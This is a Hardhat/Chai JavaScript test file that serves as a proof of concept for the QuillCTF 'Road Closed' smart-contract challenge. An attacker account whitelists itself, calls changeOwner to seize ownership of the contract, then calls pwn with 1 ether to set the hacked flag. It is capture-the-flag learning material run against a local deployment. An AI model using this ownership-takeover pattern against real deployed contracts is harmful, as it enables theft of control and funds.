const {expect} = require ("chai");
const { ethers } = require("hardhat");

// POC of first challenge Road Closed
describe ("first Quil CTF: Road Closed",()=>{
  let roadclosedcontract;
  let contractowner , contractattacker;
  const amountofether = ethers.parseEther("1");

  beforeEach(async()=>{
    // get two accounts 
    // account 1 is the normal person while, account2 is the attacker
    [contractowner,contractattacker] = await ethers.getSigners();
    // deploy the contract
    const ROADCLOSEDCONTRACT = await ethers.getContractFactory("RoadClosed");
    roadclosedcontract = await ROADCLOSEDCONTRACT.deploy();
    // Now the contract owner is the contractowner
  })

    describe ("On contract deployment" , ()=>{
      it("contractowner should be the owner of the contract" , async()=>{
        const contract_owner = await roadclosedcontract.isOwner();
        expect(contract_owner).to.equal(true);

      })
    })

    // POC
    // Attacker makes himself the owner of the contract
    describe ("Attacker connect to contract and make himself the owner of the contract and change the hacked value", ()=>{
      it ("Attacker should be the owner of the contract and value of hacked will equal be true", async() => {
          // Now attacker will call addToWhitelist to make himself whitelisted
          await roadclosedcontract.connect(contractattacker).addToWhitelist(contractattacker.address);
          // Then he call changeOwner to make himself the contract owner
          await roadclosedcontract.connect(contractattacker).changeOwner(contractattacker.address);
          // check if the attacker become the contract owner
          const current_contract_owner = await roadclosedcontract.connect(contractattacker).isOwner();
          expect(current_contract_owner).to.equal(true);
          // Now the attacker become the owner of the contract (objective 1 done).

          // change the value of hacked to true
          await roadclosedcontract.connect(contractattacker).pwn(contractattacker.address,{value:amountofether});
          const ishacked = await roadclosedcontract.connect(contractattacker).isHacked();
          expect(ishacked).to.equal(true);
          // Now the hacked value become true (objective 2 done). 
         
      } )

    } )

  
  })

 


